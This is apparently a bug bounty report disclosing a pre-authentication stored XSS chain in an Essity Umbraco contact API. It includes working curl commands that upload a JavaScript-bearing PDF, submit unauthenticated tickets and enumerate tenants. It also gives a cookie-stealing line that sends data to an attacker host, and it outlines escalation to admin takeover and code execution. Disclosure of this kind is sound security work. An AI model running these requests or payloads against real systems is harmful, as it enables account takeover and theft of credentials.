title: Pre-authentication Stored XSS in Essity Customer-Service Pipeline via ContactApi (reCAPTCHA bypass + no rate limit)
vulnerability_information: ## Summary The Essity customer contact API (`ContactApi.SavePersonalContactExtended` and `SaveProductContactExtended`) accepts unauthenticated ticket submissions with arbitrary HTML/JavaScript in 12+ fields, bypassing reCAPTCHA validation, CSRF protection, and rate limiting. When customer-service operators view these tickets in the Umbraco back-office, the stored XSS executes in their authenticated session, enabling account takeover, code execution, and cross-tenant attacks against sibling Essity brands. ## Target Endpoints - `POST https://████████/Umbraco/Api/ContactApi/SavePersonalContactExtended/` - `POST https://████████/Umbraco/Api/ContactApi/SaveProductContactExtended/` - `POST https://████████/Umbraco/Api/ContactApi/SaveAttachment` Reachable on all in-scope locale paths: `/at`, `/bg`, `/cz`, `/de`, `/ee`, `/gr`, `/hr`, `/hu`, `/lt`, `/lv`, `/ro`, `/rs`, `/ru`, `/ua`, and root `https://zewa.net/`. ## Stacked Vulnerabilities | # | Control | Status | |---|---------|--------| | 1 | reCAPTCHA v2 verification | Server accepts empty `ReCaptcha=` parameter; validation is client-side only | | 2 | CSRF token | None present; endpoint accepts requests with zero cookies | | 3 | Origin/Referer check | None; `Access-Control-Allow-Origin: *` permits cross-origin attacks | | 4 | Input sanitization | None; `"@a.com` accepted | | 6 | Rate limiting | None; 8 tickets submitted in 2 seconds, all successful | | 7 | SiteId authorization | Not enforced; any tenant ID accepted, enabling cross-brand attacks | | 8 | Attachment authorization | Not enforced; unauthenticated uploads immediately referenceable in tickets | ## Steps To Reproduce ### Step 1: Stage malicious attachment (no authentication required) ```bash # Create PDF with JavaScript payload printf '%PDF-1.3\n1 0 obj\n<< /OpenAction << /JS (app.alert(1)) >> >>\nendobj\ntrailer << /Root 1 0 R >>\n%%EOF\n' > /tmp/jsx.pdf curl -sk \ -H 'User-Agent: Mozilla/5.0' \ -H 'X-HackerOne-Research: matty69v' \ -e 'https://████████/de/kontakt/' \ -F 'file=@/tmp/jsx.pdf;type=application/pdf' \ 'https://████████/Umbraco/Api/ContactApi/SaveAttachment' ``` **Response:** ```json ["3ef49a63-e18f-40d2-94d6-5289c80f9efd_jsx.pdf"] ``` ### Step 2: Create malicious ticket with stored XSS payload ```bash curl -sk \ -H 'User-Agent: Mozilla/5.0' \ -H 'X-HackerOne-Research: matty69v' \ -e 'https://████████/de/kontakt/' \ -X POST 'https://████████/Umbraco/Api/ContactApi/SavePersonalContactExtended/' \ -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \ --data-urlencode 'SiteId=1896' \ --data-urlencode 'CultureId=1031' \ --data-urlencode 'ContactReason=Query' \ --data-urlencode 'Title=Mr' \ --data-urlencode 'FirstName=' \ --data-urlencode 'LastName=' \ --data-urlencode 'Question=test' \ --data-urlencode 'CoreCode=Z' \ --data-urlencode 'Store=store' \ --data-urlencode 'ReCaptcha=' \ --data-urlencode 'AttachmentFilename[0]=3ef49a63-e18f-40d2-94d6-5289c80f9efd_jsx.pdf' \ --data-urlencode "PageUrl=javascript:alert('pageurl')" \ --data-urlencode 'Referrer=https://example.com/' \ --data-urlencode 'SourceTags=' \ --data-urlencode 'UserAgent=' \ --data-urlencode 'ProvidedConsumerConsents[0][Id]=5' \ --data-urlencode 'ProvidedConsumerConsents[0][IsChecked]=true' \ --data-urlencode 'ProvidedConsumerConsents[0][IsNewsletter]=true' ``` **Response:** ```json {"success":true,"message":"","log":null,"redirect":false,"redirectUrl":null} ``` ### Step 3: Trigger execution When a customer-service operator logs into the Umbraco back-office and opens the ticket for review, the JavaScript in any of the 12 injected fields executes in their authenticated session. ### Step 4: Verify no rate limiting Eight consecutive submissions with empty `ReCaptcha=` from a single IP, all within 2 seconds: ```bash for i in {1..8}; do curl -sk -X POST 'https://████████/Umbraco/Api/ContactApi/SavePersonalContactExtended/' \ -H 'Content-Type: application/x-www-form-urlencoded' \ -H 'X-HackerOne-Research: matty69v' \ --data-urlencode "FirstName=ratepoc-$i" \ --data-urlencode 'LastName=Test' \ --data-urlencode 'Email=test@mailinator.com' \ --data-urlencode 'CompareEmail=test@mailinator.com' \ --data-urlencode 'SiteId=1896' \ --data-urlencode 'CultureId=1031' \ --data-urlencode 'ContactReason=Query' \ --data-urlencode 'ReCaptcha=' done ``` All 8 requests returned `{"success":true}`. ## Cross-Tenant Pivot The `SiteId` parameter accepts any valid tenant ID without authorization checks. Testing confirmed tickets can be submitted to sibling Essity brands: ```bash # Enumerate tenant IDs via CountryPicker IDOR curl -sk 'https://████████/umbraco/Surface/CountryPickerSurface/CountryModal?siteId=1901' ``` Response reveals multiple brands: - `https://████████` - `https://www.████████` - `https://www.████████` - `https://www.████████` - `https://www.████████` - `https://www.████████` An attacker targeting only `████████` can inject XSS into the customer-service back-office of any sibling brand by changing the `SiteId` parameter. ## Technical Details **Stack:** ASP.NET Core MVC + Umbraco CMS (build hash `639140017071417623`), Cloudflare CDN (no bot challenge on this path) **Why existing controls fail:** - reCAPTCHA token is collected client-side but never validated server-side - Honeypot field `contact_me_by_fax_only=1` is documented in public JS; bots already include it - Cloudflare is configured for CDN, not bot management; 30+ requests from one IP triggered no challenge **Vulnerable fields (12 total):** FirstName, LastName, Email, CompareEmail, Address, City, Country, Message, Phone, Question, ProductConcerned, CoreCode, Store, PageUrl, Referrer, SourceTags, UserAgent ## Supporting Material/References - PoC scripts demonstrating the full attack chain - Evidence of 8/8 successful submissions bypassing reCAPTCHA - Cross-tenant SiteId enumeration results - Malicious PDF upload bypassing file validation ## Impact ## Back-Office Account Takeover When an operator opens a malicious ticket in the Umbraco back-office, the stored XSS executes with their privileges (typically Editor, Writer, Translator, or Administrator roles). The attacker can: 1. **Exfiltrate session credentials**: Steal cookies, anti-XSRF tokens via `fetch('https://attacker.tld/?c='+document.cookie)` 2. **Create administrator accounts**: Call `/umbraco/management/api/v1/...` or `/umbraco/backoffice/UmbracoApi/...` endpoints in the operator's context 3. **Install malicious packages**: Upload and execute Umbraco packages containing server-side code, achieving RCE on the CMS host serving 14+ brand sites 4. **Modify content**: Alter published pages, member data, or site configuration The operator dependency is not a meaningful barrier—reviewing inbound customer messages is the operator's primary job function, guaranteeing payload execution. ## Mass Ticket Injection from Any Browser `Access-Control-Allow-Origin: *` combined with no cookie requirement enables drive-by attacks: - Malicious ad or compromised page can submit tickets from every visitor's browser - Attacker's IP is invisible (requests originate from legitimate visitors) - No rate limiting allows flooding the ticket queue in minutes ## Phishing Pipeline to Internal Staff The attachment chain delivers attacker-controlled files into the operator's workflow: - **Malicious PDFs** with JavaScript `OpenAction` execute when opened in Acrobat - **Office documents** with macros run code on internal workstations - **ZIP archives** containing LNK/EXE payloads for lateral movement File validation checks magic bytes for images but accepts PDF/DOCX/ZIP by extension only, confirmed with PoC PDF containing `app.alert(1)`. ## Cross-Brand Attack Surface A single attacker targeting `████████` can inject XSS into customer-service systems for multiple Essity brands (Lotus, Cushelle, Colhogar, Edet, papelregio) by manipulating the `SiteId` parameter. This creates: - **Operational disruption** across multiple brand support teams - **Reputational damage** spanning the entire Essity portfolio - **Investigation complexity** when malicious tickets appear to originate from legitimate brand domains ## GDPR Article 32 Breach Marketing consent flags (`ProvidedConsumerConsents[i][IsChecked]`) are accepted server-side with no verification. Attackers can: - Create subscriptions in victims' names without consent - Prevent Essity from demonstrating valid consent under Article 7 - Trigger data protection liability for every persisted fake subscription ## Severity Justification **CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:L** → **9.0 Critical** - **Attack Vector: Network** - Remotely exploitable from any internet connection - **Attack Complexity: Low** - No special preparation beyond standard HTTP requests - **Privileges Required: None** - Completely unauthenticated - **User Interaction: Required** - Operator must open the ticket (guaranteed by job function) - **Scope: Changed** - XSS executes in privileged back-office context, different from anonymous submission context - **Confidentiality: High** - Access to operator session, customer PII, internal CRM data - **Integrity: High** - Ability to modify CMS content, create accounts, install code - **Availability: Low** - Ticket flood can disrupt support operations but not destroy the platform
